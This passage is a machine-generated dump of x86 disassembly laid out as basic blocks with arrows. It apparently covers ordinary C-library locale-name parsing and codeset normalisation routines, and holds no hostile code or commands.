0xb02c081:	jne	0xb02bfd8
None
|
|
|
v
0xb02bc87:	mov	eax, dword ptr [esp + 0x7c]
0xb02bc8b:	xor	esi, esi
0xb02bc8d:	and	eax, 1
0xb02bc90:	mov	dword ptr [esp + 0x48], eax
0xb02bc94:	je	0xb02bca8
None
|
|
|
v
0xb02bf10:	mov	edi, dword ptr [esp + 0x7c]
0xb02bf14:	lea	ebp, dword ptr [ebx - 0x4a949]
0xb02bf1a:	mov	dword ptr [esp + 0x40], ebp
0xb02bf1e:	mov	ebp, dword ptr [esp + 0x7c]
0xb02bf22:	not	edi
0xb02bf24:	jmp	0xb02bf34
None
|
|
|
v
0xb02bc20:	push	ebp
0xb02bc21:	xor	ebp, ebp
0xb02bc23:	push	edi
0xb02bc24:	push	esi
0xb02bc25:	push	ebx
0xb02bc26:	sub	esp, 0x5c
0xb02bc29:	call	0xb1267db
None
|
|
|
v
0xb02c0ce:	lea	edx, dword ptr [eax + 1]
0xb02c0d1:	mov	byte ptr [eax], 0x2e
0xb02c0d4:	mov	eax, dword ptr [esp + 0x8c]
0xb02c0db:	mov	dword ptr [esp], edx
0xb02c0de:	mov	dword ptr [esp + 4], eax
0xb02c0e2:	call	0xb07cd00
None
|
|
|
v
0xb02c0ec:	lea	edx, dword ptr [eax + 1]
0xb02c0ef:	mov	byte ptr [eax], 0x2e
0xb02c0f2:	mov	eax, dword ptr [esp + 0x88]
0xb02c0f9:	mov	dword ptr [esp], edx
0xb02c0fc:	mov	dword ptr [esp + 4], eax
0xb02c100:	call	0xb07cd00
None
|
|
|
v
0xb02bd89:	mov	edi, dword ptr [esp + 0x94]
0xb02bd90:	add	eax, 1
0xb02bd93:	mov	byte ptr [eax - 1], 0x2f
0xb02bd97:	mov	dword ptr [esp], eax
0xb02bd9a:	mov	dword ptr [esp + 4], edi
0xb02bd9e:	xor	edi, edi
0xb02bda0:	call	0xb07a810
None
|
|
|
v
0xb02bdaf:	nop	
None
|
|
|
v
0xb02bdc3:	test	eax, eax
0xb02bdc5:	je	0xb02c09e
None
|
|
|
v
0xb02c15b:	xor	eax, eax
0xb02c15d:	jmp	0xb02bfcd
None
|
|
|
v
0xb02c087:	mov	edx, dword ptr [esp + 0x78]
0xb02c08b:	test	edx, edx
0xb02c08d:	je	0xb02bee8
None
|
|
|
v
0xb02bcfe:	test	eax, eax
0xb02bd00:	mov	esi, eax
0xb02bd02:	je	0xb02c15b
None
|
|
|
v
0xb02beb6:	mov	edi, dword ptr [esp + 0x7c]
0xb02beba:	cmp	eax, 1
0xb02bebd:	sete	al
0xb02bec0:	movzx	eax, al
0xb02bec3:	sub	edi, eax
0xb02bec5:	js	0xb02c154
None
|
|
|
v
0xb02c09c:	xor	ebp, ebp
0xb02c09e:	mov	dword ptr [esp], esi
0xb02c0a1:	call	0xb017470
None
|
|
|
v
0xb02bdb7:	mov	dword ptr [esp + 4], esi
0xb02bdbb:	mov	dword ptr [esp], eax
0xb02bdbe:	call	0xb07a740
None
|
|
|
v
0xb02c0c9:	jmp	0xb02bd89
None
|
|
|
v
0xb02bc54:	mov	eax, dword ptr [esp + 0x84]
0xb02bc5b:	mov	dword ptr [esp], eax
0xb02bc5e:	call	0xb07ae80
None
|
|
|
v
0xb02bcc9:	mov	eax, dword ptr [esp + 0x94]
0xb02bcd0:	mov	dword ptr [esp + 0x3c], edx
0xb02bcd4:	mov	dword ptr [esp], eax
0xb02bcd7:	call	0xb07ae80
None
|
|
|
v
0xb02c012:	mov	ecx, dword ptr [esp + 0x94]
0xb02c019:	mov	edx, dword ptr [esp + 0x90]
0xb02c020:	mov	dword ptr [esp + 0x28], 1
0xb02c028:	mov	dword ptr [esp + 0xc], edi
0xb02c02c:	mov	dword ptr [esp + 0x24], ecx
0xb02c030:	mov	ecx, dword ptr [esp + 0x8c]
0xb02c037:	mov	dword ptr [esp + 0x20], edx
0xb02c03b:	mov	edx, dword ptr [esp + 0x88]
0xb02c042:	add	eax, 1
0xb02c045:	mov	dword ptr [esp + 8], eax
0xb02c049:	mov	eax, dword ptr [esp + 0x70]
0xb02c04d:	mov	dword ptr [esp + 0x1c], ecx
0xb02c051:	mov	ecx, dword ptr [esp + 0x84]
0xb02c058:	mov	dword ptr [esp + 0x18], edx
0xb02c05c:	mov	edx, dword ptr [esp + 0x80]
0xb02c063:	mov	dword ptr [esp + 4], ebp
0xb02c067:	mov	dword ptr [esp], eax
0xb02c06a:	mov	dword ptr [esp + 0x14], ecx
0xb02c06e:	mov	dword ptr [esp + 0x10], edx
0xb02c072:	call	0xb02bc20
None
|
|
|
v
0xb02bdb0:	mov	eax, dword ptr [ebp]
0xb02bdb3:	test	eax, eax
0xb02bdb5:	je	0xb02bdcf
None
|
|
|
v
0xb02bef0:	xor	ebp, ebp
0xb02bef2:	test	dword ptr [esp + 0x40], edi
0xb02bef6:	je	0xb02c07f
None
|
|
|
v
0xb02bfac:	mov	edx, dword ptr [esp + 0x3c]
0xb02bfb0:	cmp	ebp, 0xff
0xb02bfb3:	mov	dword ptr [edx + esi*4 + 0x10], eax
0xb02bfb7:	mov	esi, dword ptr [esp + 0x38]
0xb02bfbb:	jne	0xb02bf34
None
|
|
|
v
0xb02bc75:	mov	eax, dword ptr [esp + 0x88]
0xb02bc7c:	mov	dword ptr [esp], eax
0xb02bc7f:	call	0xb07ae80
None
|
|
|
v
0xb02c154:	xor	esi, esi
0xb02c156:	jmp	0xb02bf04
None
|
|
|
v
0xb02c0a6:	add	esp, 0x5c
0xb02c0a9:	mov	eax, ebp
0xb02c0ab:	pop	ebx
0xb02c0ac:	pop	esi
0xb02c0ad:	pop	edi
0xb02c0ae:	pop	ebp
0xb02c0af:	ret	
None
|
|
|
v
0xb02bc96:	mov	eax, dword ptr [esp + 0x8c]
0xb02bc9d:	mov	dword ptr [esp], eax
0xb02bca0:	call	0xb07ae80
None
|
|
|
v
0xb02bdcb:	js	0xb02bdd6
None
|
|
|
v
0xb02bd20:	mov	eax, dword ptr [esp + 0x78]
0xb02bd24:	mov	dword ptr [esp + 8], 0x3a
0xb02bd2c:	mov	dword ptr [esp], esi
0xb02bd2f:	mov	dword ptr [esp + 4], eax
0xb02bd33:	call	0xb07f470
None
|
|
|
v
0xb02bca5:	lea	esi, dword ptr [eax + 1]
0xb02bca8:	mov	eax, dword ptr [esp + 0x7c]
0xb02bcac:	xor	edx, edx
0xb02bcae:	and	eax, 8
0xb02bcb1:	mov	dword ptr [esp + 0x4c], eax
0xb02bcb5:	je	0xb02bcc9
None
|
|
|
v
0xb02bd59:	mov	ecx, dword ptr [esp + 0x40]
0xb02bd5d:	test	ecx, ecx
0xb02bd5f:	jne	0xb02c10a
None
|
|
|
v
0xb02c128:	mov	eax, dword ptr [esp + 0x7c]
0xb02c12c:	xor	edx, edx
0xb02c12e:	and	eax, 3
0xb02c131:	cmp	eax, 3
0xb02c134:	sete	dl
0xb02c137:	jmp	0xb02be7f
None
|
|
|
v
0xb02bcdc:	mov	edx, dword ptr [esp + 0x78]
0xb02bce0:	mov	ecx, dword ptr [esp + 0x38]
0xb02bce4:	lea	ecx, dword ptr [edx + ecx + 2]
0xb02bce8:	mov	edx, dword ptr [esp + 0x3c]
0xb02bcec:	add	ebp, ecx
0xb02bcee:	add	edi, ebp
0xb02bcf0:	add	esi, edi
0xb02bcf2:	add	edx, esi
0xb02bcf4:	add	eax, edx
0xb02bcf6:	mov	dword ptr [esp], eax
0xb02bcf9:	call	0xb0173f0
None
|
|
|
v
0xb02bc63:	lea	ebp, dword ptr [eax + 1]
0xb02bc66:	mov	eax, dword ptr [esp + 0x7c]
0xb02bc6a:	xor	edi, edi
0xb02bc6c:	and	eax, 2
0xb02bc6f:	mov	dword ptr [esp + 0x44], eax
0xb02bc73:	je	0xb02bc87
None
|
|
|
v
0xb02bee8:	sub	edi, 1
0xb02beeb:	cmp	edi, 0xff
0xb02beee:	je	0xb02bf04
None
|
|
|
v
0xb02bcb7:	mov	eax, dword ptr [esp + 0x90]
0xb02bcbe:	mov	dword ptr [esp], eax
0xb02bcc1:	call	0xb07ae80
None
|
|
|
v
0xb02bfcd:	add	esp, 0x5c
0xb02bfd0:	pop	ebx
0xb02bfd1:	pop	esi
0xb02bfd2:	pop	edi
0xb02bfd3:	pop	ebp
0xb02bfd4:	ret	
None
|
|
|
v
0xb02bdcd:	mov	edi, ebp
0xb02bdcf:	mov	ebp, dword ptr [ebp + 0xc]
0xb02bdd2:	test	ebp, ebp
0xb02bdd4:	jne	0xb02bdb0
None
|
|
|
v
0xb02c0b0:	lea	edx, dword ptr [eax + 1]
0xb02c0b3:	mov	byte ptr [eax], 0x40
0xb02c0b6:	mov	eax, dword ptr [esp + 0x90]
0xb02c0bd:	mov	dword ptr [esp], edx
0xb02c0c0:	mov	dword ptr [esp + 4], eax
0xb02c0c4:	call	0xb07cd00
None
|
|
|
v
0xb02bc43:	mov	dword ptr [esp + 0x38], eax
0xb02bc47:	mov	eax, dword ptr [esp + 0x7c]
0xb02bc4b:	and	eax, 4
0xb02bc4e:	mov	dword ptr [esp + 0x40], eax
0xb02bc52:	je	0xb02bc66
None
|
|
|
v
0xb02be57:	mov	eax, dword ptr [esp + 0x3c]
0xb02be5b:	mov	dword ptr [eax], esi
0xb02be5d:	mov	eax, dword ptr [esp + 0x78]
0xb02be61:	mov	dword ptr [esp + 4], eax
0xb02be65:	mov	eax, dword ptr [esp + 0x74]
0xb02be69:	mov	dword ptr [esp], eax
0xb02be6c:	call	0xb07f050
None
|
|
|
v
0xb02bca8:	mov	eax, dword ptr [esp + 0x7c]
0xb02bcac:	xor	edx, edx
0xb02bcae:	and	eax, 8
0xb02bcb1:	mov	dword ptr [esp + 0x4c], eax
0xb02bcb5:	je	0xb02bcc9
None
|
|
|
v
0xb02c105:	jmp	0xb02bd71
None
|
|
|
v
0xb02bfc1:	mov	eax, dword ptr [esp + 0x3c]
0xb02bfc5:	mov	dword ptr [eax + esi*4 + 0x10], 0
0xb02bfcd:	add	esp, 0x5c
0xb02bfd0:	pop	ebx
0xb02bfd1:	pop	esi
0xb02bfd2:	pop	edi
0xb02bfd3:	pop	ebp
0xb02bfd4:	ret	
None
|
|
|
v
0xb02c093:	mov	ebp, dword ptr [esp + 0x74]
0xb02c097:	jmp	0xb02bfff
None
|
|
|
v
0xb02be71:	mov	edx, 1
0xb02be76:	cmp	eax, 1
0xb02be79:	je	0xb02c128
None
|
|
|
v
0xb02bdf9:	mov	ecx, dword ptr [esp + 0x7c]
0xb02bdfd:	mov	edx, dword ptr [esp + 0x7c]
0xb02be01:	and	ecx, 0xffffaaaa
0xb02be07:	and	edx, 0x5555
0xb02be0d:	sar	ecx, 1
0xb02be0f:	add	eax, eax
0xb02be11:	add	ecx, edx
0xb02be13:	mov	edx, ecx
0xb02be15:	and	ecx, 0x3333
0xb02be1b:	and	edx, 0xffffcccc
0xb02be21:	sar	edx, 2
0xb02be24:	add	edx, ecx
0xb02be26:	mov	ecx, edx
0xb02be28:	sar	ecx, 4
0xb02be2b:	add	edx, ecx
0xb02be2d:	and	edx, 0xf0f
0xb02be33:	mov	ecx, edx
0xb02be35:	sar	ecx, 8
0xb02be38:	add	ecx, edx
0xb02be3a:	shl	eax, cl
0xb02be3c:	lea	eax, dword ptr [eax*4 + 0x14]
0xb02be43:	mov	dword ptr [esp], eax
0xb02be46:	call	0xb0173f0
None
|
|
|
v
0xb02c162:	mov	dword ptr [esp], esi
0xb02c165:	call	0xb017470
None
|
|
|
v
0xb02bde5:	mov	eax, dword ptr [esp + 0x78]
0xb02bde9:	mov	dword ptr [esp + 4], eax
0xb02bded:	mov	eax, dword ptr [esp + 0x74]
0xb02bdf1:	mov	dword ptr [esp], eax
0xb02bdf4:	call	0xb07f050
None
|
|
|
v
0xb02c10a:	lea	edx, dword ptr [eax + 1]
0xb02c10d:	mov	byte ptr [eax], 0x5f
0xb02c110:	mov	eax, dword ptr [esp + 0x84]
0xb02c117:	mov	dword ptr [esp], edx
0xb02c11a:	mov	dword ptr [esp + 4], eax
0xb02c11e:	call	0xb07cd00
None
|
|
|
v
0xb02befc:	sub	edi, 1
0xb02beff:	cmp	edi, 0xff
0xb02bf02:	jne	0xb02bef0
None
|
|
|
v
0xb02bf34:	test	edi, ebp
0xb02bf36:	jne	0xb02bf28
None
|
|
|
v
0xb02be95:	mov	eax, dword ptr [edi + 0xc]
0xb02be98:	mov	esi, dword ptr [esp + 0x3c]
0xb02be9c:	mov	dword ptr [esi + 0xc], eax
0xb02be9f:	mov	dword ptr [edi + 0xc], esi
0xb02bea2:	mov	eax, dword ptr [esp + 0x78]
0xb02bea6:	mov	dword ptr [esp + 4], eax
0xb02beaa:	mov	eax, dword ptr [esp + 0x74]
0xb02beae:	mov	dword ptr [esp], eax
0xb02beb1:	call	0xb07f050
None
|
|
|
v
0xb02bcc6:	lea	edx, dword ptr [eax + 1]
0xb02bcc9:	mov	eax, dword ptr [esp + 0x94]
0xb02bcd0:	mov	dword ptr [esp + 0x3c], edx
0xb02bcd4:	mov	dword ptr [esp], eax
0xb02bcd7:	call	0xb07ae80
None
|
|
|
v
0xb02bd38:	mov	eax, dword ptr [esp + 0x78]
0xb02bd3c:	lea	eax, dword ptr [esi + eax - 1]
0xb02bd40:	mov	byte ptr [eax], 0x2f
0xb02bd43:	lea	edx, dword ptr [eax + 1]
0xb02bd46:	mov	eax, dword ptr [esp + 0x80]
0xb02bd4d:	mov	dword ptr [esp], edx
0xb02bd50:	mov	dword ptr [esp + 4], eax
0xb02bd54:	call	0xb07cd00
None
|
|
|
v
0xb02c0e7:	jmp	0xb02bd7d
None
|
|
|
v
0xb02bf38:	mov	edx, dword ptr [esp + 0x94]
0xb02bf3f:	lea	eax, dword ptr [esi + 1]
0xb02bf42:	mov	dword ptr [esp + 0xc], ebp
0xb02bf46:	sub	ebp, 1
0xb02bf49:	mov	dword ptr [esp + 0x28], 1
0xb02bf51:	mov	dword ptr [esp + 8], 0x1b
0xb02bf59:	mov	dword ptr [esp + 0x24], edx
0xb02bf5d:	mov	edx, dword ptr [esp + 0x90]
0xb02bf64:	mov	dword ptr [esp + 0x38], eax
0xb02bf68:	mov	dword ptr [esp + 0x20], edx
0xb02bf6c:	mov	edx, dword ptr [esp + 0x8c]
0xb02bf73:	mov	dword ptr [esp + 0x1c], edx
0xb02bf77:	mov	edx, dword ptr [esp + 0x88]
0xb02bf7e:	mov	dword ptr [esp + 0x18], edx
0xb02bf82:	mov	edx, dword ptr [esp + 0x84]
0xb02bf89:	mov	dword ptr [esp + 0x14], edx
0xb02bf8d:	mov	edx, dword ptr [esp + 0x80]
0xb02bf94:	mov	dword ptr [esp + 0x10], edx
0xb02bf98:	mov	edx, dword ptr [esp + 0x40]
0xb02bf9c:	mov	dword ptr [esp + 4], edx
0xb02bfa0:	mov	edx, dword ptr [esp + 0x70]
0xb02bfa4:	mov	dword ptr [esp], edx
0xb02bfa7:	call	0xb02bc20
None
|
|
|
v
0xb02c13c:	mov	eax, dword ptr [esp + 0x70]
0xb02c140:	mov	edi, dword ptr [esp + 0x3c]
0xb02c144:	mov	eax, dword ptr [eax]
0xb02c146:	mov	dword ptr [edi + 0xc], eax
0xb02c149:	mov	eax, dword ptr [esp + 0x70]
0xb02c14d:	mov	dword ptr [eax], edi
0xb02c14f:	jmp	0xb02bea2
None
|
|
|
v
0xb02bfd8:	cmp	ebp, dword ptr [esp + 0x38]
0xb02bfdc:	jae	0xb02bee8
None
|
|
|
v
0xb02be7f:	mov	eax, dword ptr [esp + 0x3c]
0xb02be83:	test	edi, edi
0xb02be85:	mov	dword ptr [eax + 4], edx
0xb02be88:	mov	dword ptr [eax + 8], 0
0xb02be8f:	je	0xb02c13c
None
|
|
|
v
0xb02c123:	jmp	0xb02bd65
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b02c180
TOTAL BLOCKS :25
0xb02c1b8:	movzx	edx, byte ptr [eax]
0xb02c1bb:	test	byte ptr [edi + edx*2], 8
0xb02c1bf:	je	0xb02c1d2
None
|
|
|
v
0xb02c1c1:	sub	edx, 0x30
0xb02c1c4:	add	ebp, 1
0xb02c1c7:	cmp	edx, 0xa
0xb02c1ca:	mov	edx, 0
0xb02c1cf:	cmovae	ecx, edx
0xb02c1d2:	add	eax, 1
0xb02c1d5:	cmp	eax, esi
0xb02c1d7:	jne	0xb02c1b8
None
|
|
|
v
0xb02c216:	movzx	ecx, byte ptr [eax]
0xb02c219:	movzx	edx, cl
0xb02c21c:	test	byte ptr [edi + edx*2 + 1], 4
0xb02c221:	jne	0xb02c200
None
|
|
|
v
0xb02c250:	add	ebp, 4
0xb02c253:	mov	dword ptr [esp], ebp
0xb02c256:	call	0xb0173f0
None
|
|
|
v
0xb02c1dd:	add	ebp, 1
0xb02c1e0:	mov	dword ptr [esp], ebp
0xb02c1e3:	call	0xb0173f0
None
|
|
|
v
0xb02c223:	sub	edx, 0x30
0xb02c226:	cmp	edx, 9
0xb02c229:	ja	0xb02c20f
None
|
|
|
v
0xb02c180:	push	ebp
0xb02c181:	push	edi
0xb02c182:	push	esi
0xb02c183:	push	ebx
0xb02c184:	sub	esp, 0x1c
0xb02c187:	mov	edx, dword ptr [esp + 0x34]
0xb02c18b:	call	0xb1267db
None
|
|
|
v
0xb02c190:	add	ebx, 0x17ee70
0xb02c196:	test	edx, edx
0xb02c198:	je	0xb02c28d
None
|
|
|
v
0xb02c238:	mov	ecx, ebp
0xb02c23a:	mov	byte ptr [ecx], 0
0xb02c23d:	mov	eax, dword ptr [esp + 0xc]
0xb02c241:	add	esp, 0x1c
0xb02c244:	pop	ebx
0xb02c245:	pop	esi
0xb02c246:	pop	edi
0xb02c247:	pop	ebp
0xb02c248:	ret	
None
|
|
|
v
0xb02c278:	mov	eax, dword ptr [esp + 0x30]
0xb02c27c:	mov	esi, dword ptr [esp + 0x34]
0xb02c280:	mov	edi, dword ptr [ebx - 0xf8c]
0xb02c286:	add	esi, eax
0xb02c288:	jmp	0xb02c1f8
None
|
|
|
v
0xb02c1d2:	add	eax, 1
0xb02c1d5:	cmp	eax, esi
0xb02c1d7:	jne	0xb02c1b8
None
|
|
|
v
0xb02c1f2:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb02c25b:	test	eax, eax
0xb02c25d:	mov	dword ptr [esp + 0xc], eax
0xb02c261:	je	0xb02c23d
None
|
|
|
v
0xb02c253:	mov	dword ptr [esp], ebp
0xb02c256:	call	0xb0173f0
None
|
|
|
v
0xb02c200:	mov	ecx, dword ptr [ebx - 0xf88]
0xb02c206:	add	ebp, 1
0xb02c209:	mov	edx, dword ptr [ecx + edx*4]
0xb02c20c:	mov	byte ptr [ebp - 1], dl
0xb02c20f:	add	eax, 1
0xb02c212:	cmp	eax, esi
0xb02c214:	je	0xb02c238
None
|
|
|
v
0xb02c28d:	mov	ebp, 4
0xb02c292:	jmp	0xb02c253
None
|
|
|
v
0xb02c1e8:	test	eax, eax
0xb02c1ea:	mov	ecx, eax
0xb02c1ec:	mov	dword ptr [esp + 0xc], eax
0xb02c1f0:	je	0xb02c23d
None
|
|
|
v
0xb02c23d:	mov	eax, dword ptr [esp + 0xc]
0xb02c241:	add	esp, 0x1c
0xb02c244:	pop	ebx
0xb02c245:	pop	esi
0xb02c246:	pop	edi
0xb02c247:	pop	ebp
0xb02c248:	ret	
None
|
|
|
v
0xb02c20f:	add	eax, 1
0xb02c212:	cmp	eax, esi
0xb02c214:	je	0xb02c238
None
|
|
|
v
0xb02c23a:	mov	byte ptr [ecx], 0
0xb02c23d:	mov	eax, dword ptr [esp + 0xc]
0xb02c241:	add	esp, 0x1c
0xb02c244:	pop	ebx
0xb02c245:	pop	esi
0xb02c246:	pop	edi
0xb02c247:	pop	ebp
0xb02c248:	ret	
None
|
|
|
v
0xb02c22b:	add	eax, 1
0xb02c22e:	add	ebp, 1
0xb02c231:	mov	byte ptr [ebp - 1], cl
0xb02c234:	cmp	eax, esi
0xb02c236:	jne	0xb02c216
None
|
|
|
v
0xb02c1f8:	mov	eax, dword ptr [esp + 0x30]
0xb02c1fc:	mov	ebp, ecx
0xb02c1fe:	jmp	0xb02c216
None
|
|
|
v
0xb02c1d9:	test	ecx, ecx
0xb02c1db:	jne	0xb02c250
None
|
|
|
v
0xb02c19e:	mov	eax, dword ptr [esp + 0x30]
0xb02c1a2:	mov	ecx, 1
0xb02c1a7:	xor	ebp, ebp
0xb02c1a9:	mov	esi, dword ptr [esp + 0x34]
0xb02c1ad:	mov	edi, dword ptr [ebx - 0xf8c]
0xb02c1b3:	add	esi, eax
0xb02c1b5:	lea	esi, dword ptr [esi]
0xb02c1b8:	movzx	edx, byte ptr [eax]
0xb02c1bb:	test	byte ptr [edi + edx*2], 8
0xb02c1bf:	je	0xb02c1d2
None
|
|
|
v
0xb02c263:	mov	eax, dword ptr [esp + 0xc]
0xb02c267:	mov	dword ptr [eax], 0x6f7369
0xb02c26d:	lea	ecx, dword ptr [eax + 3]
0xb02c270:	mov	eax, dword ptr [esp + 0x34]
0xb02c274:	test	eax, eax
0xb02c276:	je	0xb02c23a
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b02c2a0
TOTAL BLOCKS :49
0xb02c460:	mov	edi, dword ptr [esp + 0x4c]
0xb02c464:	add	esi, 1
0xb02c467:	mov	byte ptr [esi - 1], 0
0xb02c46b:	mov	dword ptr [edi], esi
0xb02c46d:	movzx	edx, byte ptr [eax + 1]
0xb02c471:	test	dl, dl
0xb02c473:	je	0xb02c4c8
None
|
|
|
v
0xb02c344:	cmp	dl, 0x2e
0xb02c347:	je	0xb02c398
None
|
|
|
v
0xb02c4dc:	mov	dword ptr [esp], edx
0xb02c4df:	mov	edi, ebp
0xb02c4e1:	call	0xb017470
None
|
|
|
v
0xb02c3d7:	mov	edx, esi
0xb02c3d9:	sub	edx, eax
0xb02c3db:	mov	dword ptr [esp + 4], edx
0xb02c3df:	mov	dword ptr [esp], eax
0xb02c3e2:	mov	dword ptr [esp + 0x18], ecx
0xb02c3e6:	call	0xb02c180
None
|
|
|
v
0xb02c37a:	add	esp, 0x2c
0xb02c37d:	pop	ebx
0xb02c37e:	pop	esi
0xb02c37f:	pop	edi
0xb02c380:	pop	ebp
0xb02c381:	ret	
None
|
|
|
v
0xb02c494:	mov	edi, 4
0xb02c499:	jmp	0xb02c440
None
|
|
|
v
0xb02c31b:	add	esi, 1
0xb02c31e:	movzx	edx, byte ptr [esi]
0xb02c321:	cmp	dl, 0x5f
0xb02c324:	jne	0xb02c308
None
|
|
|
v
0xb02c411:	mov	ecx, dword ptr [esp + 0x18]
0xb02c415:	mov	edx, dword ptr [esp + 0x1c]
0xb02c419:	test	eax, eax
0xb02c41b:	je	0xb02c4dc
None
|
|
|
v
0xb02c48f:	cmp	dl, 0x40
0xb02c492:	jne	0xb02c480
None
|
|
|
v
0xb02c352:	mov	eax, dword ptr [esp + 0x4c]
0xb02c356:	mov	eax, dword ptr [eax]
0xb02c358:	test	eax, eax
0xb02c35a:	je	0xb02c367
None
|
|
|
v
0xb02c2ff:	mov	esi, edi
0xb02c301:	jmp	0xb02c31b
None
|
|
|
v
0xb02c3ad:	mov	ebp, eax
0xb02c3af:	jmp	0xb02c3ba
None
|
|
|
v
0xb02c390:	xor	edi, edi
0xb02c392:	lea	esi, dword ptr [esi]
0xb02c398:	lea	eax, dword ptr [esi + 1]
0xb02c39b:	mov	byte ptr [esi], 0
0xb02c39e:	mov	dword ptr [ecx], eax
0xb02c3a0:	movzx	edx, byte ptr [esi + 1]
0xb02c3a4:	test	dl, 0xbf
0xb02c3a7:	je	0xb02c4d2
None
|
|
|
v
0xb02c349:	cmp	dl, 0x40
0xb02c34c:	je	0xb02c440
None
|
|
|
v
0xb02c438:	cmp	edi, esi
0xb02c43a:	je	0xb02c4a0
None
|
|
|
v
0xb02c480:	add	esi, 1
0xb02c483:	movzx	edx, byte ptr [esi]
0xb02c486:	cmp	dl, 0x2e
0xb02c489:	je	0xb02c4c8
None
|
|
|
v
0xb02c4fe:	mov	eax, 0xffffffff
0xb02c503:	jmp	0xb02c37a
None
|
|
|
v
0xb02c30c:	cmp	dl, 0x40
0xb02c30f:	nop	
0xb02c310:	je	0xb02c438
None
|
|
|
v
0xb02c4d2:	or	edi, 2
0xb02c4d5:	mov	esi, eax
0xb02c4d7:	jmp	0xb02c349
None
|
|
|
v
0xb02c475:	cmp	dl, 0x2e
0xb02c478:	jne	0xb02c48f
None
|
|
|
v
0xb02c3fb:	mov	ecx, dword ptr [esp + 0x18]
0xb02c3ff:	mov	dword ptr [esp + 4], edx
0xb02c403:	mov	dword ptr [esp + 0x1c], edx
0xb02c407:	mov	eax, dword ptr [ecx]
0xb02c409:	mov	dword ptr [esp], eax
0xb02c40c:	call	0xb07a740
None
|
|
|
v
0xb02c2a0:	push	ebp
0xb02c2a1:	push	edi
0xb02c2a2:	push	esi
0xb02c2a3:	push	ebx
0xb02c2a4:	sub	esp, 0x2c
0xb02c2a7:	mov	eax, dword ptr [esp + 0x48]
0xb02c2ab:	mov	ecx, dword ptr [esp + 0x50]
0xb02c2af:	mov	edi, dword ptr [esp + 0x40]
0xb02c2b3:	call	0xb1267db
None
|
|
|
v
0xb02c48b:	test	dl, dl
0xb02c48d:	je	0xb02c4c8
None
|
|
|
v
0xb02c421:	mov	eax, dword ptr [esp + 0x14]
0xb02c425:	or	edi, 3
0xb02c428:	movzx	edx, byte ptr [eax + 1]
0xb02c42c:	jmp	0xb02c349
None
|
|
|
v
0xb02c326:	cmp	edi, esi
0xb02c328:	mov	eax, esi
0xb02c32a:	je	0xb02c4a0
None
|
|
|
v
0xb02c4b6:	mov	ecx, dword ptr [esp + 0x14]
0xb02c4ba:	mov	esi, eax
0xb02c4bc:	movzx	edx, byte ptr [eax]
0xb02c4bf:	jmp	0xb02c349
None
|
|
|
v
0xb02c3b8:	mov	ebp, esi
0xb02c3ba:	movzx	edx, byte ptr [ebp + 1]
0xb02c3be:	lea	esi, dword ptr [ebp + 1]
0xb02c3c1:	test	dl, 0xbf
0xb02c3c4:	jne	0xb02c3b8
None
|
|
|
v
0xb02c43c:	xor	edi, edi
0xb02c43e:	nop	
0xb02c440:	mov	edx, dword ptr [esp + 0x48]
0xb02c444:	lea	eax, dword ptr [esi + 1]
0xb02c447:	mov	byte ptr [esi], 0
0xb02c44a:	mov	dword ptr [edx], eax
0xb02c44c:	mov	eax, edi
0xb02c44e:	or	eax, 8
0xb02c451:	cmp	byte ptr [esi + 1], 0
0xb02c455:	cmovne	edi, eax
0xb02c458:	jmp	0xb02c352
None
|
|
|
v
0xb02c3c6:	mov	dword ptr [esp + 0x14], ebp
0xb02c3ca:	mov	ebp, edi
0xb02c3cc:	or	ebp, 2
0xb02c3cf:	cmp	eax, esi
0xb02c3d1:	je	0xb02c4f7
None
|
|
|
v
0xb02c367:	mov	edx, dword ptr [ecx]
0xb02c369:	mov	eax, edi
0xb02c36b:	test	edx, edx
0xb02c36d:	je	0xb02c37a
None
|
|
|
v
0xb02c3ba:	movzx	edx, byte ptr [ebp + 1]
0xb02c3be:	lea	esi, dword ptr [ebp + 1]
0xb02c3c1:	test	dl, 0xbf
0xb02c3c4:	jne	0xb02c3b8
None
|
|
|
v
0xb02c35c:	mov	edx, edi
0xb02c35e:	and	edx, 0xfffffffb
0xb02c361:	cmp	byte ptr [eax], 0
0xb02c364:	cmove	edi, edx
0xb02c367:	mov	edx, dword ptr [ecx]
0xb02c369:	mov	eax, edi
0xb02c36b:	test	edx, edx
0xb02c36d:	je	0xb02c37a
None
|
|
|
v
0xb02c3eb:	mov	edx, eax
0xb02c3ed:	mov	eax, dword ptr [esp + 0x54]
0xb02c3f1:	test	edx, edx
0xb02c3f3:	mov	dword ptr [eax], edx
0xb02c3f5:	je	0xb02c4fe
None
|
|
|
v
0xb02c4a0:	mov	dword ptr [esp], edi
0xb02c4a3:	xor	edi, edi
0xb02c4a5:	mov	dword ptr [esp + 4], 0
0xb02c4ad:	mov	dword ptr [esp + 0x14], ecx
0xb02c4b1:	call	0xb07ed60
None
|
|
|
v
0xb02c330:	xor	edi, edi
0xb02c332:	cmp	dl, 0x40
0xb02c335:	je	0xb02c440
None
|
|
|
v
0xb02c398:	lea	eax, dword ptr [esi + 1]
0xb02c39b:	mov	byte ptr [esi], 0
0xb02c39e:	mov	dword ptr [ecx], eax
0xb02c3a0:	movzx	edx, byte ptr [esi + 1]
0xb02c3a4:	test	dl, 0xbf
0xb02c3a7:	je	0xb02c4d2
None
|
|
|
v
0xb02c2f7:	cmp	al, 0x2e
0xb02c2f9:	je	0xb02c4a0
None
|
|
|
v
0xb02c4c8:	mov	edi, 4
0xb02c4cd:	jmp	0xb02c344
None
|
|
|
v
0xb02c316:	cmp	dl, 0x2e
0xb02c319:	je	0xb02c388
None
|
|
|
v
0xb02c47a:	jmp	0xb02c4c8
None
|
|
|
v
0xb02c388:	cmp	edi, esi
0xb02c38a:	je	0xb02c4a0
None
|
|
|
v
0xb02c2ef:	cmp	al, 0x5f
0xb02c2f1:	je	0xb02c4a0
None
|
|
|
v
0xb02c2b8:	add	ebx, 0x17ed48
0xb02c2be:	mov	dword ptr [eax], 0
0xb02c2c4:	mov	eax, dword ptr [esp + 0x4c]
0xb02c2c8:	mov	dword ptr [eax], 0
0xb02c2ce:	mov	eax, dword ptr [esp + 0x54]
0xb02c2d2:	mov	dword ptr [ecx], 0
0xb02c2d8:	mov	dword ptr [eax], 0
0xb02c2de:	mov	eax, dword ptr [esp + 0x44]
0xb02c2e2:	mov	dword ptr [eax], edi
0xb02c2e4:	movzx	eax, byte ptr [edi]
0xb02c2e7:	test	al, 0xbf
